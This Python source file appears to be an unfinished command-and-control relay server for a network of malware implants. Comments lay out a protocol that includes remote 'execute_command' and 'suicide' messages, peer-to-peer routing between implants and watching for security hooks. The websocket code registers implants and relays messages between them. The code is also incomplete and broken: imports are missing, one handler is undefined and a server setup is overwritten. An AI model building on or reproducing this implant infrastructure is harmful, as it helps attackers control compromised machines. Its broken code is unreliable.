clients = {}
print(clients)

#implant pings signal c2
#signal c2 registers node, sends back LIST of destinations
#
#
# packet format:
#   dest: id, all
#       id: encrypted with implant specific public key
#       all: encrypted with implant universal public key
#
#   type: wegood, routing_table, req_restructure, isAlive, execute_command, suicide, node_casualty
#       req_restructure: ask the c2 to change the graph structure of the p2p network
#       isAlive: can any node communicate with this node?
#       node_casualty: node is unreachable
#
#   content:
#
#monitor IAT tables for commonly hooked functions
async def send_command_ws(web, path, dest, data):
    message = json.loads(data)
    destination_id = dest
    destination_websocket = clients.get(destination_id)
    await destination_websocket.send(data)

async def listen_handle(websocket, path):
    client_id = None
    try:
        splitted = path.split('/')
        splitted.pop(0)
        client_id = splitted.pop(0)
        print('Client {} connected'.format(client_id))
        clients[client_id] = websocket
        while True:
            data = await websocket.recv()
            print('Client {} << {}'.format(client_id, data))
            message = json.loads(data)
            destination_id = message['id']
            destination_websocket = clients.get(destination_id)
            if destination_websocket:
                message['id'] = client_id
                data = json.dumps(message)
                print('Client {} >> {}'.format(destination_id, data))
                await destination_websocket.send(data)
            else:
                print('Client {} not found'.format(destination_id))

    except Exception as e:
        print(e)
    finally:
        if client_id:
            del clients[client_id]
            print('Client {} disconnected'.format(client_id))

if __name__ == '__main__':
    # Usage: ./server.py [[host:]port] [SSL certificate file]
    endpoint_or_port = sys.argv[1] if len(sys.argv) > 1 else "8000"
    ssl_cert = sys.argv[2] if len(sys.argv) > 2 else None

    endpoint = endpoint_or_port if ':' in endpoint_or_port else "10.0.0.143:" + endpoint_or_port

    if ssl_cert:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(ssl_cert)
    else:
        ssl_context = None

    print('Listening on {}'.format(endpoint))
    host, port = endpoint.rsplit(':', 1)
    start_server = websockets.serve(listen_handle, host, int(port), ssl=ssl_context)
    start_server = websockets.serve(send_handle, host, int(port), ssl=ssl_context)
    asyncio.get_event_loop().run_until_complete(start_server)
    asyncio.get_event_loop().run_forever()
